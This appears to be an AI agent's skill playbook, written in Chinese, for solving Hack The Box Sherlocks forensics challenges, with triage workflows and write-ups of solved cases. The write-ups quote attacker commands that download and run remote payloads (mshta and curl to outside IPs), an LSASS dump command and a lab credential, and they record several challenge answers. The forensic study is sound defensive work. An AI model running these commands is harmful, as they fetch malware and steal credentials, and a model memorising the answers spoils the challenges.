---
name: 'sherlock-investigation'
description: 'HTB Sherlocks 取证调查：题型识别→样本静态分析/CTI画像/内存取证/日志分析/KAPE端点/攻击者机器 全流程，含续做（API 一次拿每题 completed+已答 flag）、AD 入侵双源取证（pcap 秒 vs evtx UTC 秒、4104/7045/4662/4768 PreAuthType=16）、7-Zip/MRU 注册表取证与全部关键坑（检索词：sherlock/forensics/dfir/cti/memory/log/triage/KAPE/EVTX/BloodHound/Sliver/SharpGPOAbuse/429/rate-limit/续做/resume/7zip/FolderHistory/ArcHistory/MRU/rate limit/sherlock investigation/AD入侵/pcap/evtx/SaSync/PsExec/7045/DCSync/4662/Shadow Credentials/msDS-KeyCredentialLink/PreAuthType/constrained delegation/S4U2Proxy/xp_cmdshell/MSSQL/VM型/xfreerdp/NLA/盲RDP/blind-RDP/ovpn证书轮换/cert-rotation/letsdefend/malware.zip/勒索软件/ransomware/PE逆向/Mallox/onion/ransomware-reverse-engineering/计数口径/xref定位/JSON转义/ConvertTo-Json/422/flag field is required/报文序列化/vm terminate/virtual_machine active/VBS/脚本类样本/script sample/WScript/Schedule.Service/StdRegProv/AntiVirusProduct/Win32_Process/RecentFiles/Kimsuky）'
whenToUse: '做 HTB Sherlocks 取证题时（含接手/续做旧进度）：题型识别→样本静态分析/CTI画像/内存取证/日志分析/KAPE端点/攻击者机器/7-Zip 与 MRU 注册表取证/VM 型 RDP 取证机（盲操作通道）/PE 勒索软件逆向 全流程。'
metadata: { domain: forensics, tier: T1 }
---
# HTB Sherlocks 取证调查 playbook

> 用法: 用 skill 工具按名加载 sherlock-investigation
> 收到新 Sherlocks 题目时调用。传入完整场景描述，按题型路由到对应流程。

## 0. 环境准备（每次必做）

> 🔴🔴 **脚本目录的绝对路径**：`C:\Users\<user>\dsh-htb-skills\scripts\`
> **本卡下面所有 `scripts/xxx.mjs` 一律指这个目录** —— 它**不在工作区里**，
> 所以从工作区 cwd 用相对路径 `scripts/...` 一定解析不到（`glob` 只会回
> `No files found`）。要执行就写全：
> `node "C:\Users\<user>\dsh-htb-skills\scripts\sherlock.mjs" info <slug>`
>
> 📌 **实测代价（2026-09-27, SaSync）**：token 过期时，工具报的提示写的是相对路径
> `node scripts/htb-token-refresh.mjs --force`，agent 连试 3 次 glob 全空
> → 只好手工开 Playwright 抓 `localStorage['htb-token']` → 又满盘找存下来的文件
> → 白烧 **8 次 pwsh + 5 次浏览器调用**，还留下 3 个野 token 文件。
> **而 token 其实一直是好的**（计划任务每天 09:00 刷新，剩余 62 小时）。
> 正确做法就一条：`node "C:\Users\<user>\dsh-htb-skills\scripts\htb-token-refresh.mjs" --check`
> （只查状态，**不开浏览器**；需要才 `--force`）。
>
> 🥇 **首选顺序**：能用插件工具 `htb_sherlock_*` 就别用脚本；脚本只在工具不够用
> （如限流需纯 POST）时上。

> 🤖 **下载/取题/交答案走自动化脚本 `scripts/sherlock.mjs`**（Node 18+，零依赖，Windows/Kali 都能跑）。别再手动抓 Playwright 或猜 API。

**⭐ 第 0 步（续做 / 接手旧进度必做）：一次调用拿"每题是否已答 + 已答对的答案原文"**

```bash
# labs 直连（Bearer token 在 ~/.dsh/htb-token.txt）；返回里 completed=true 的题，flag 字段就是当时提交的正确答案
curl -s -H "Authorization: Bearer $(cat ~/.dsh/htb-token.txt)" -H "Accept: application/json" \
  https://labs.hackthebox.com/api/v4/sherlocks/{id}/tasks
# → data[]: {id, title, description, completed, flag, masked_flag}
```

- **Sleigh Slayer (834) 实战**：`progress` 只说 23/24，看不出差哪题；`/tasks` 一次列出全部 24 题 → `[ ] 4393 Task 9` 唯一未完成，其余 23 题的 `flag` 原样拿到，**省掉重做全部旧题的成本**（否则要重解 23 题）。
- 这条通道比"Playwright 抓 play 页面 Submit disabled"快得多（见 §8），**优先用它**；play 页面只在 API 不可用时兜底。
- 拿到旧 flag 后立刻写进 `PROGRESS.md` 答案表（有些老题答案下次还要复用）。
- 同理：`GET /api/v4/sherlocks/{id}` 给 `play_methods`（`download` / `vm`）、`file_password`、`difficulty`。

```bash
# 1. token 自动刷新（3 天有效）—— 已挂计划任务 HTB-Token-Refresh，每天 09:00 检查，剩余 <24h 自动重取。
#    手动 / 立即刷新：
node scripts/htb-token-refresh.mjs          # 需要时刷新（幂等：剩余 >12h 直接退出，不开浏览器）
node scripts/htb-token-refresh.mjs --check  # 只看当前 token 状态（不开浏览器）
node scripts/htb-token-refresh.mjs --force  # 强制重取
#    原理：复用 Playwright MCP 的持久化 profile（里面已有登录态），读 localStorage['htb-token'] 落盘到 ~/.dsh/htb-token.txt。
#    新机器首次使用：加 --headed 打开浏览器登录一次，之后长期复用，无需账号密码。
# 2. 拉题目（场景+任务+hint+mask 全在这）：
node scripts/sherlock.mjs info <slug>          # 例: info Baggage
node scripts/sherlock.mjs tasks <slug>         # 只列任务 id/hint/mask
# 3. 下附件（zip 密码默认 hacktheblue，--password 覆盖）：
node scripts/sherlock.mjs download <slug> -o ./work
# 4. 交答案（task 可用任务 id 或 1-based 序号；submit-file 批量交 JSON）：
node scripts/sherlock.mjs submit <slug> 2 "Everything 1.4.1.1028"
node scripts/sherlock.mjs submit-file <slug> answers.json   # {"1":"...","2":"..."}
node scripts/sherlock.mjs progress <slug>      # owned / 进度 / rank
```

手动备选（脚本不可用时）：

1. **附件获取**: zip 密码通常是 HTB 默认 `hacktheblue`（题目描述/场景里也可能给），**先试密码再爆破**
2. **大文件（>100MB）直接在有外网的分析机下载**（curl 签名链接即可），别先下本机再传输
3. 小文件（<50MB）可本地下载后 `scp` 到分析机 `/tmp/`（按你环境的 SSH 别名/端口）
4. 分析机上 Volatility3：用 `which vol` 或完整路径（如 `/usr/local/bin/vol`，PATH 里可能没有）
5. 解压后 `file` 确认类型 → 路由到对应题型

## 1. 题型识别（读场景描述第一句就判断）

| 场景关键词 | 题型 | 流程 |
|---|---|---|
| "static analysis" / "suspicious binary" / 给 .zip 含 ELF/PE 样本 | 恶意样本静态分析 | §2 |
| "build a comprehensive profile of the threat actor" / 给多篇报告 URL | CTI 威胁画像 | §3 |
| "memory dump" / "rootkit" / "memory forensics" / 给 .mem/.raw + profile | 内存取证 | §4 |
| 日志文件（IIS/EDR/Sysmon/PCAP） | 日志分析 | §5 |
| 磁盘镜像（E01/raw） | 磁盘取证 | §6 |
| KAPE/采集目录（`C\`+`Active Directory\`+`*ConsoleLog.txt`/`*CopyLog.csv`），"inside threat/域内攻击链" | **Windows 端点取证** | §6 |
| "confiscated his laptop" / 攻击者机器 triage（`exploit\`+`recon\`+`loot\`） | **攻击者机器取证** | §6 |
| NTUSER.DAT / UsrClass.dat 注册表 hive，"文件夹何时被访问/访问过什么" | Shellbag 取证 | §7 |
| 给 NTUSER.DAT，题问"哪个 zip 被 7zip 枚举过 / 压缩包里有什么目录 / 7z 复制到哪" | **应用 MRU / 7-Zip 历史取证** | §6.1 + 卡 `windows-app-mru-forensics` |
| 题问的文件本体**不在采集里**（"谁打开过它"） | 应用 MRU 家族（RecentDocs/OpenSavePidlMRU/Jumplist/IconLayouts） | 卡 `windows-app-mru-forensics` |
| `play_methods:["vm"]` + 场景给 `xfreerdp /v:<ip> /u:letsdefend /p:''` + "Malware Location: Desktop/xxx.zip" | **VM 型 Sherlock（RDP 取证机）** | §7.12 |
| 给 .zip 含 PE，题问"DLL/注册表键数/执行什么命令/终止几个进程/几个参数/邮箱/onion" | **勒索软件 / PE 逆向** | §7.13 + 卡 `malware-static-analysis` |
| `file` 报 `ASCII/UTF-8 text` 且后缀 `.vbs/.vbe/.js/.jse/.hta/.ps1/.wsf` | **脚本类样本（VBS/JS/HTA/PS1）** | §7.14（**直接读，别反编译**） |
| 附件是 **Android `/data` 采集**（`android_triage.tar.gz`：`data/data/<pkg>` + `data/media/0` + `data/system`）+ pcap；场景含 "phishing / banking trojan / overlay attack / 社工" | **Android 银行木马取证（APK 逆向 + 设备取证 + C2 解密）** | §7.15 |

## 2. 恶意样本静态分析（四板斧）

```bash
file + sha256sum → strings -n 4 → readelf -d（NEEDED 库）→ nm（未剥离直接看函数名）
→ objdump -d 反汇编关键函数 → objdump -s -j .rodata 确认字符串精确字节
```text

🔴 坑：
- **函数名/输出字符串 ≠ 实际比较的命令字符串**：命令分发真相在反汇编 strncmp/strcmp 引用的 .rodata 地址字节（Phantom Ring: cmd_selfdestruct 函数但命令是 `sdestruct`）
- **命令字符串数 ≠ 命令种类数**：别名（ss/netstat → 同一分支）按种类算
- 端口 = `htons()` 里的常量反转；重连延时 = `sleep()` 参数
- 答案以字节为准，不以直觉/文案为准；题目掩码长度是精确提示（`**********-**` = 10字符+连字符+2字符）

## 3. CTI 威胁画像（四步）

```text
1. 抓全报告: mcp__tavily__tavily_extract 逐篇抓；截断 → Kali curl + python 去 HTML 标签
   （re.sub(r"<[^>]+>", " ", raw) + html.unescape；TOC 干扰用 rfind 找正文起点）
2. 提取事实表: 身份/别名/时间线/目标/动机/武器库(版本演进/C2变化/CVE)/基础设施/IOC/受害者
3. 交叉关联: 同一组织不同厂商命名（Kaspersky "X" = Knownsec 404 "Y"）；武器溯源
4. 映射 ATT&CK + 逐题对掩码
```text

🔴 坑：
- **答案带版本号时掩码会提示**（Asyncshell-v2 教训：全小写+版本号，以报告原文为准）
- 厂商拼写不一致（Asyncshell vs AsyncShell）→ 原文优先
- 防混淆：同工具多文件/多版本别搞混（ts.dat vs $cache.dat）
- ATT&CK ID 是纯记忆题: T1547.001(启动项) / T1059.001(PowerShell) / T1041(Exfil Over C2)

## 4. Linux 内存取证（10 步 rootkit 检测链）

```text
1. linux.pslist → 可疑进程
2. linux.psscan vs pslist 差集 = 隐藏进程
3. linux.hidden_modules → 隐藏模块（OOT_MODULE, UNSIGNED_MODULE = 核心 IOC）
4. linux.check_syscall → 是否 syscall 劫持
5. 🔴 linux.tracing.ftrace.CheckFtrace → ftrace hook 列表（集中回调地址 = 分发器）
6. linux.tracing.tracepoints.CheckTracepoints → tracepoint probe（sched_process_fork 类）
7. linux.sockstat → C2（FD 0/1/2 同一 socket = 反连 shell）
8. linux.bash → 行为证据（环境变量/信号/命令）
9. 🔴 linux.kmsg → 权威时间线 + 加载者（Task(N) 字段 = 瞬态 insmod 进程）
10. 识别开源 rootkit（GitHub 搜索特征）→ 源码验证答案
```text

🔴 坑：
- **pslist 时间戳可被 rootkit 伪造**（伪造 start_time），时间线以 kmsg 为准
- **加载模块的进程是瞬态的**（insmod 后退出），只有 kmsg Task(N) 能证明
- **题目措辞决定数法**："how many hooks" 数 ftrace 条目（含 x64/ia32 变体）；"variants" 数家族变体
- module_extract 失败 = rootkit 反取证特征，别死磕
- 隐藏进程特征: 内核线程 PPID=2、maps 为空

## 5. 日志分析（快速路径）

- Web 日志: 先找 200 后跟 5xx/异常 UA/编码 payload → grep 注入特征
- EDR/Sysmon: 按时间线排事件，找进程树异常（父进程不匹配）
- PCAP: `tshark -Y "http.request || dns" -T fields` 先看协议分布，再跟流
- 思路: 场景描述给"结果"（如数据泄露），倒推"入口"（初始 payload）

## 6. Windows 端点取证：KAPE triage + 攻击者机器（Caught Hard 全通）

> 题型：给一坨采集目录（`DC01\`/`C\`/`Active Directory\` + `*ConsoleLog.txt`/`*CopyLog.csv`/`*SkipLog.csv`），
> 或给"攻击者机器"整盘 triage（`kali\exploit\`+`recon\`+`loot\`）。**不是 E01，别去找挂载镜像。**

**先读三个日志（决定后面往哪挖）**：
- `*ConsoleLog.txt` — 采集器自己的输出（跑了哪些模块/哪些报错）
- `*CopyLog.csv` — 每个被采集文件的 `源路径,目标路径,大小,hash,时间戳` → **直接当文件清单+时间线用**
- `*SkipLog.csv` — 采集失败/被排除项；**攻击者删掉或锁定的文件常在这里露馅**

**证据路由表（先做这个再逐题）**：
| 答案类型 | 首选证据源 |
|---|---|
| 受害者执行的命令行 | PowerShell Operational **4104 ScriptBlock** / Security **4688** / Sysmon **EID1** |
| 新建用户 / 改组 | Security **4720**(建号) / 4728·4732·4756(入组) / 4724(改密) |
| 计划任务持久化 | Security **4698** + `C:\Windows\System32\Tasks\*`(XML 里的 Command/Arguments) |
| 服务持久化 | System **7045** |
| 缓存明文凭据 | `mimikatz.log`（sekurlsa::logonpasswords 输出）或 LSASS dump |
| 提权工具落盘 | `C:\Windows\Tasks\*.exe` 类非标准路径 + Prefetch/Amcache 执行痕迹 |
| 域内权限链 | 攻击者机器上的 **BloodHound 原始 JSON**（见下） |
| 哪个压缩包被打开/枚举、包内有哪些目录、7z 创建/复制/移动去了哪 | NTUSER.DAT `Software\7-Zip\*`（**§6.1**；REG_BINARY 的 UTF-16 MultiSZ，直接 `strings` 会漏） |
| 文件本体不在采集里，但"谁打开过它 / 桌面曾存在什么" | 应用 MRU 家族：`OpenSavePidlMRU` / `RecentDocs` / Jumplist(Quick Access) / `Shell\Bags\1\Desktop\IconLayouts` → 卡 `windows-app-mru-forensics` |

**KAPE triage 固定流程（LogForge 1221 沉淀，2026-09-23 从 `.skills-archive` 抢救回灌）**：
`TypedPaths → PowerShell 4104 → Chrome History + JumpList → MFT resident → Prefetch(SI Mod) → Sysmon 状态(反取证) → SRUM/Amcache 排除`

- **TypedPaths**（NTUSER.DAT）= 资源管理器地址栏输入过的路径（regipy iter_values）——用户/攻击者手动去过哪
- **PowerShell EID 4104** `ScriptBlockText` = 恶意命令**全文**（4688 只有截断的命令行）
- **MFT resident data**：<700B 的小文件（`.js`/`.url`/`README.txt`）内容**直接存在 MFT 记录里**，不用去磁盘翻
- **JumpList**：`strings -el` 解；AppID `590aee7bdd69b59b`=PowerShell、`5d696d521de238c3`=Chrome recently-closed
- **Prefetch**：Win10 的 `MAM\x04` 是压缩格式，`strings` 读不出 → 改用 **MFT 里 `.pf` 的 SI Modification = 最后运行时间**
- **Chrome History/Session 时间戳** = 微秒级、**1601 纪元**（别按 Unix 纪元算）
- **反取证信号**：SRUM 最后快照停在某天（如 08-10）而当天之后全空 = 有人清了；Sysmon 服务被停同理
- 排除法靠 SRUM/Amcache 交叉，别只看 Prefetch

### 6.1 "用 7zip 打开/枚举了哪个压缩包、包里有什么"（Sleigh Slayer Hard 24/24 沉淀）

> 题型：问"攻击者用 7zip 枚举了某个 zip，包内某目录叫什么 / 7z 把文件复制到哪 / 最后浏览到哪"。
> **致命前提：压缩包本体往往已被移走，不在采集里** → 不要去解压，去读 **7-Zip 自己写在 NTUSER.DAT 里的历史**。

四道键一次全读（全部 `HKCU\Software\7-Zip\...`；注意 7-Zip 会同时写 `7-Zip` 和 `7-zip` 两个大小写键，都要看）：

| 键 | 类型 | 回答什么问题 |
|---|---|---|
| `FM\FolderHistory` | REG_BINARY = **UTF-16LE MULTI_SZ** | ⭐ **浏览历史，且连"进入压缩包内部"的路径都记**（`<zip全路径>\<包内目录>\`）→ "包里有什么"的唯一答案源 |
| `FM\CopyHistory` | 同上 | 7z 复制/移动的**目标目录** |
| `Compression\ArcHistory` | 同上 | 最近创建/打开的归档（7z 打的包名） |
| `FM\PanelPath0`(`1`) | REG_SZ | 最后一次面板所在目录（题问"最后访问的路径"→ 去掉尾部 `\`） |

解码（python-registry，**MultiSZ 必须按 utf-16-le 解**；顺带全 hive 扫 `.zip` 字符串）：

```python
from Registry import Registry
r = Registry.Registry(r'...\Users\santa\NTUSER.DAT')
v = r.open(r'Software\7-Zip\FM').value('FolderHistory').value()
print([x for x in v.decode('utf-16-le', 'replace').split('\x00') if x.strip('\x00')])
```

**Sleigh Slayer 战例（T9）**：题目问 "用 7zip 枚举 Santa 桌面上一个 zip，包里与圣诞奖金相关的目录"。
`finance_christmas.zip` 不在采集里（桌面只有 `Christmas24\`/`Promotions\`/`MERRY KRAMPUS.txt`），但 `FM\FolderHistory` 完整列出：

```
C:\Users\santa\Desktop\finance_christmas.zip\finance_christmas\Employees\performance_bonus_24\   ← 答案
C:\Users\santa\Desktop\finance_christmas.zip\finance_christmas\Employees\
C:\Users\santa\Desktop\finance_christmas.zip\finance_christmas\
C:\Users\santa\Desktop\finance_christmas.zip\finance_christmas\North-Workshop\
C:\Users\santa\Desktop\finance_christmas.zip\
```
答案 `C:\Users\santa\Desktop\finance_christmas.zip\finance_christmas\Employees\performance_bonus_24\`（**保留掩码要求的尾部 `\`**）。
同题组另外三问也全出自这四道键：T8=`FM\CopyHistory`、T10=`Compression\ArcHistory`、T11=`FM\PanelPath0`。

**🔴 坑**：
- **别只 `strings`**：这些值是 REG_BINARY 存 UTF-16LE MultiSZ，ASCII strings 一条都读不出；用 python-registry 解出来再 split `\x00`。
- **别因为"zip 不在证据里"就放弃**：先问"谁会记录它"（注册表 MRU → 卡 `windows-app-mru-forensics`），再决定要不要样本本体。
- 旁证：`HKCU\Software\Microsoft\Windows\Shell\Bags\1\Desktop\IconLayouts` 里也有 `finance_christmas.zip` / `transfer_scanned.zip` / `KAPE.zip` 字样，可交叉确认"桌面曾存在该 zip"。
- 反向也被验证：prefetch（PECmd）只记 7z 进程加载的 DLL/少量文件，**不会记 GUI 里翻过哪些目录**——别指望 prefetch 回答包内目录。


**攻击者机器三件套**：
1. `exploit\` — 武器库（LNK/JS/EXE/MSI/工具）。LNK 用 `WScript.Shell CreateShortcut()` 读 TargetPath/Arguments（同 §7.7）；
   大体积 JS 是混淆载荷 → §2 + `malware-static-analysis`；装载器/C2 名字（SharpShooter/Sliver 类）通常直接出现在载荷或配置里
2. `recon\bloodhound\*_users.json / _groups.json / _gpos.json / _computers.json` — **离线读原始 JSON，不必开 GUI**：
   先建 SID→名 映射（`ObjectIdentifier` → `Properties.name`，去掉 `@DOMAIN`），再解每条 `Aces[].PrincipalSID` + `RightName`
   → 直接得到 `主体 -权限-> 目标` 三元组（题目 "Format: AD object,privilege,AD object" 问的就是它）
3. `loot\` — 战果（mimikatz.log、hash、导出文件）

**🔴 坑（Caught 实测）**：
- **掩码按段校验三元组**：`**********,***********,*********` = 10/11/9 字符 → `Developers`/`GenericAll`/`Engineers` 一次锁死；AD 对象名**不写 `@domain`**
- **权限链方向别反**：问"pivot 到另一个组"= 找 `Aces` 落在**目标组**上的那条，主体是**当前组**（Caught: `DEVELOPERS -GenericAll-> ENGINEERS -GenericWrite-> MEGAPOLICY`）
- **"最初属于 / 当前属于"**：组归属要合并 `PrimaryGroupSID` 与 BloodHound memberOf；"current" 包含攻击者后来加的组（排序+逗号分隔按题目要求）
- **提权工具路径题**：答**落盘完整路径**（`C:\Windows\Tasks\SharpGPOAbuse.exe`），不是仓库名/文件名；GPO 滥用命令见 `ad-checklist §11.1`
- **NTDS/AD 库**：`Active Directory\` 下有 ntds.dit 时走 `secretsdump -ntds` / `esedbexport`，别硬解

**Caught 攻击链（Hard，22/22）**：钓鱼 LNK → PowerShell 隐藏窗口加载 `MegaCorpServiceWorker.js`（key `wdnpmsiaev`）→ SharpShooter 装载 + **Sliver** C2
→ PrintSpoofer 用 `SeImpersonatePrivilege`（`-c c:\windows\tasks\MegaCorpSync.exe`）拿 SYSTEM → 失陷机 **WS01** / 账号 **osmith**
→ mimikatz 抓缓存明文 `mtucker:LUmRfx9h22jhpEj` → `Developers -GenericAll-> Engineers -GenericWrite-> MEGAPOLICY`
→ SharpGPOAbuse 下发本地管理员 → 新建用户 **Robbin Ooi** + 注册表 **RegistryBackup** 持久化 `mshta http://45.123.76.89/MEGACORP_DataSync.hta`

## 7. Windows Shellbag 取证（文件夹访问证据）

> 题型：给 NTUSER.DAT + UsrClass.dat 注册表 hive（常见 KAPE 采集），问"哪个文件夹/网络共享/归档被访问、何时访问、staging/exfil 路径"。

**工具（首选 SBECmd，别手写 python-registry 解析）**：
- 下载 https://download.ericzimmermanstools.com/net9/SBECmd.zip（Eric Zimmerman，.NET 9）
- Windows 上 `dotnet --list-runtimes` 有 9.x 即可直接跑：`SBECmd.exe -d <hive目录> --csv <输出目录>`
- CSV 关键列：`AbsolutePath` / `ShellType` / `Value` / `LastWriteTime` / `FirstInteracted` / `LastInteracted`

🔴 坑：
- **hive 脏要 LOG 事务日志**：活取证拷贝的 hive 报 "Registry hive is dirty... Aborting" → 把同名的 LOG1/LOG2 一起拷到同目录（Windows 大小写不敏感，`ntuser.dat.LOG1` 能匹配 `NTUSER.DAT`）
- **"Last Interacted" ≠ BagMRU 节点 LastWrite**：题目 hint 说 "Last Interacted Timestamp" 时，答案 = CSV 的 `LastInteracted` 列（该目录的 Shellbag 条目键最后被交互的时间），不是节点 LastWriteTime。同一目录在两个用户 hive 里都有条目 → 取 `LastInteracted` 非空的那个
- **时间戳是 UTC**：SBECmd 输出 UTC，直接填答案，不要换时区（换时区会错）
- **Win11 结构**：子文件夹名作为二进制 value 存在父键上（value "0"/"1"/"2"… = 各子文件夹名，同名 subkey = 各子条目）。手写 python-registry 会漏读/误读名字（"a" 被读成 "a4"、"OT Station 3 internal VPN" 被读成 PIDL 乱码）→ 直接上 SBECmd
- **zip 内容**：归档被浏览时 zip 变 folder，内容条目 ShellType="Zip file contents"，AbsolutePath 形如 `...\a.zip\a\Engineers Tab/a/`（末尾斜杠=父目录）；值里会夹带格式化日期字符串
- **UNC 网络共享**：`Desktop\Computers and Devices\Prod-ns-2\Prod-ns-2\prodshare` = `\\Prod-ns-2\prodshare`（ShellType=Network location）
- **已知文件夹**：BagMRU 值里的 GUID 是已知文件夹 CLSID（如 `088E3905-0323-4B02-9826-5D99428E115F` = Downloads）

**实战链（Baggage，Very Easy）**：受害者 Steve(OT 工程师) → 钓鱼下 1.zip → 攻击者带进 Everything 1.4.1.1028 搜敏感数据 → 浏览 Documents\{OT Station 3 internal VPN, OnePassword MasterPass, Engineers Tab} + 网络共享 Construction 2027\Dam Construction Engineer Plans.zip → staging 到 C:\Users\steve\Pictures\a → 压缩成 a.zip 外泄。答案全在 shellbag 的 LastInteracted 时间戳 + AbsolutePath 里。

## 7.5 Windows 内存取证：Discord/社交工程时间线（社工题核心）

> 题型：社工取证（招聘者/钓鱼），问"攻击者何时首次联系受害者"。答案 = 攻击者账号第一条 DM 消息时间。**消息内容 ≠ 消息时间戳**——内容在 renderer 进程字符串池（孤立字符串），id/时间在别处。

**定位流程**：
1. **vol3 pslist**（VMEM 需同目录同名 .vmsn 元数据，否则层无法解析）：找 Discord.exe 各进程，主进程=toast/网关，**renderer 子进程=聊天渲染**（最大的那个，PID 7604 类）
2. **windows.memmap --pid <renderer> --dump** → 进程内存（~1GB）
3. 在 renderer dump 里找消息 id（时间戳从 snowflake 解：(id>>22)+1420070400000，**必须 UTC 感知构造范围，Kali 默认 EDT 会偏移 4 小时**）：
   - **React 渲染 key**：`chat-messages-{频道id}-{消息id}` ← 最权威，直接列出频道全部可见消息
   - **ReadState**：`ack_messages__{频道id}_Channel`（localStorage 键，值=最后已读消息 id）
   - `ANIMATE_CHAT_AVATAR_{消息id}:{用户id}` / `TOGGLE_REACTION_POPOUT_{消息id}`
   - deeplink：`discord://discordapp.com/channels/{guild}/{channel}/{msg}`、`channels/@me/{dm频道id}/{msg}`
   - ack URL：`/api/v9/channels/{频道}/messages/{消息}/ack`
4. **频道 id 定位**：DM 频道 URL 形如 `channels/@me/{id}`（无 guild）；guild 频道 `channels/{guild}/{channel}`。频道/服务器创建时间也是 snowflake
5. **消息内容**：直接 strings 搜（"Hi Klaus" 等），可确认是谁发的（附近有用户名）

🔴 坑：
- **首条消息 ≠ 频道创建 ≠ 服务器加入**：Discord DM 频道在首条消息时创建（id 相近但不同）；受害者可能先经 LinkedIn/邮件等其他渠道加入服务器，Discord 首次联系是**另一天**。三个时间要分开验证
- **"attacker first contact"** = 攻击者账号首条 DM（renderer 渲染 key 里该频道最早的消息 id），不是加入时间/频道创建时间/马甲注册时间
- **V8 HeapNumber**：消息 id 若以 double 存（非 ASCII），用 numpy 全扫 `np.fromfile(dump,dtype=uint8).view('<f8')` 过滤 1.44e18~1.45e18
- **主进程只有 toast**：历史消息加载在 renderer；MESSAGE_CREATE 事件只含实时消息

## 7.6 SRUM 网络字节（"外传了多少字节"题）

- SRUDB.dat（`C:\Windows\System32\SRU\`）→ Kali `esedbexport -t out SRUDB.dat`
- **{973F5D5C-1D90-4944-BE8E-24B94231A174} 表 = NetworkDataUsage**：列 BytesSent/BytesRecvd = 该进程每小时网络字节（**权威总量**）
- **SruDbIdMapTable**：IdBlob 是 **hex 编码的 UTF-16**（`!!路径!日期!哈希!参数`），unhexlify+utf-16-le 解码；IdType 0=AppId、3=UserId(SID)；UserId 20=某用户(-1001)
- 恶意进程 AppId：对比采样日期，11-29 首次出现且只出现一次的 = 恶意；外传字节 = 恶意进程 BytesSent 总和
- 🔴 坑：AppResourceUse（{5C8CF1C7-...}）的 NetworkBytesRaw 是 **timeline 压缩采样**（非总量），别拿它当答案；别把"附件 zip 大小和"(7080B)当网络字节——SRUM 才是网络层实际值

## 7.7 云同步服务取证（OneDrive 恶意文件投递，CorpDown-1 Medium 全通）

> 题型：攻击者用偷来的云凭据把恶意文件推送到端点（"compromised cloud-sync service"），问下载 URL / 促成文件路径 / 云端创建时间。

**工具链（按顺序）**：
1. **odl.py 解码 OneDrive 日志（.odlgz/.aodl，关键突破！）**：ydkhatri/OneDrive 仓库
   - `EBFGONED` 头占 **0x100 字节**（内含 OneDrive 版本串），偏移 0x100 后是 **gzip 流**（`zlib.decompressobj(31)`），再后是 CDEF_V2/V3 块（每条含 timestamp/Code_File/Function/Params）
   - 依赖 `pip install construct pycryptodome`；同目录需 `general.keystore`（JSON，AES 密钥）
   - 命令：`python odl.py -o out.csv <logs目录>`；CSV 列：Filename/File_Index/Timestamp(UTC)/Code_File/Function/Params_Decoded
   - 日志文件名的日期时间 = 本地时间；**条目时间戳 = UTC**
2. **SyncEngineDatabase.db**（`%LOCALAPPDATA%\Microsoft\OneDrive\settings\Personal\`）：
   - `od_HydrationData`：resourceID + firstHydrationTime（水合=云端→本地下载记录）
   - `od_ClientFile_Records`：当前盘上文件的 lastChange(=云端 Modified)/diskCreationTime(=水合时刻)/itemIndex
   - `od_ServiceOperationHistory`：DownloadBlock/EnumChanges/UploadBatch/InlineUploadBatch 精确时间线
   - 🔴 水合文件不在 ClientFile 表 = 已被删除/移动（恶意文件同步落地后移走）
3. **恶意 lnk 解析**：`WScript.Shell` COM `CreateShortcut()` 拿 TargetPath/Arguments（CorpDown-1 的 lnk = `cmd /c curl -o %TEMP%\wctBB85s.exe http://IP:PORT/t.exe && start ...`）

**🔴 坑（CorpDown-1 实测）**：
- **OneDrive 时间戳语义**：水合文件本地 `Created` = 水合时刻，`Modified` = **云端 lastModifiedDateTime**（攻击者构造文件的时间戳，不是云端创建时间！）。"created in the cloud" 的答案 = **客户端首次同步/占位符创建时刻**（OnDownloadedEntries→CreatePlaceholder，本组 T11 = 13:16:09）
- **云端替换产生新 resourceID**：同一文件名被反复上传 = 多个 resourceID（仅最后一个留在 ClientFile 表），每次替换本地 WatcherWin 检测 `FILE_ACTION_MODIFIED` + `HandleLocalCreateFileRemotelyAdded`
- **`wct*.tmp` = OneDrive 自己的下载临时文件**（DownloaderUtil::CopyLocalFile 模式），别误判为浏览器下载
- 水合触发者显示在 `handleHydrateFile` 参数（explorer.exe = 用户双击）
- `CWinHttpSession::CreateRequest GET .../download.aspx?UniqueId=<resourceID>` = 水合实际下载 URL（内部后端，不是题目答案形态）
- 分享动作（GetLinkShare/ShareBrowser→odwebp.svc.ms/share）与上传无必然先后关系
- 上传与检测时间差 = EnumChanges 轮询间隔，**无法精确定位上传播时刻** → 答案取客户端首次可见时间

## 7.8 加壳样本动态观察（静态反汇编失败时的逃生舱，CorpDown-1 T6）

> 症状：PE 入口只有 `jmp` 到加密节（如 .0Dev）、.text 主体乱码、任何 xref/字符串引用都找不到、节字节频率异常（0x66 密集 = 加密数据）。

**方案（隔离 + 网络侧观察，别硬啃壳）**：
1. 防火墙出站阻止目标：`New-NetFirewallRule -DisplayName X -Direction Outbound -RemoteAddress <IP> -Action Block`（域名先 `Resolve-DnsName` 转 IP 再逐条加）
2. 开启防火墙日志：`Set-NetFirewallProfile -LogBlocked True -LogFileName C:\Windows\Temp\pf.log`
3. 在隔离目录运行样本 → 等 30-60s → 杀进程 → 读 `pfirewall.log`（连接目标 IP:port）+ **样本自写日志**
4. 🔴 **stealer/木马常自写 debug 日志**（如 debug.log/debug_log.txt）→ 直接打印目标 URL（CorpDown-1 的 `31.12.245.210:8011/info` 就是这么拿到的！）
5. 运行后清理：删规则、删隔离目录、杀残留进程

**🔴 坑**：
- **配置字段分离**：IP 可能存配置（XOR 加密），端口/路径硬编码在代码里 → 静态只能拿到一半，动态运行是唯一可靠确认
- 之前候选被拒常常只是**缺端口**（31.12.245.210/info ❌ → 31.12.245.210:8011/info ✅）
- XOR 扫描的假阳性：`:80` 出现可能是 `Chrome`/`Google` 等词被 XOR 的结果（逐字节验证）
- 动态分析安全底线：出站全阻止 + 隔离目录 + 完成后清理

## 7.9 多源日志全链 IR + 自定义 C2 解密（VelvetThrone Hard 全通）

> 题型：给 Okta/Azure AD/Sysmon/Security/代理/DNS/netflow/Defender/SharePoint/邮件 等 15+ 种日志 JSON，重建攻击链：MFA 推送轰炸→植入→LSASS→横向→25GB exfil→RC4 C2→DNS 隐蔽信道。

**证据路由表（先做这个再逐题）**：
| 答案类型 | 首选证据源 |
|---|---|
| MFA 推送轰炸账号/源 IP | Okta `user.mfa.challenge` + `user.authentication.auth_via_mfa`（看 FAILURE 潮→SUCCESS；登录发起 IP 恒定 = 攻击者） |
| 恶意进程/命令 | Security 4688 + Sysmon EID1 CommandLine（**wmic 输出在 EID1 的 `Details` 字段**！） |
| LSASS dump | Security 4688 `procdump -ma lsass` + Defender `Behavior:Win32/LsassRead.A` |
| 服务账号 | SharePoint audit `UserId`（= LSASS 收获） |
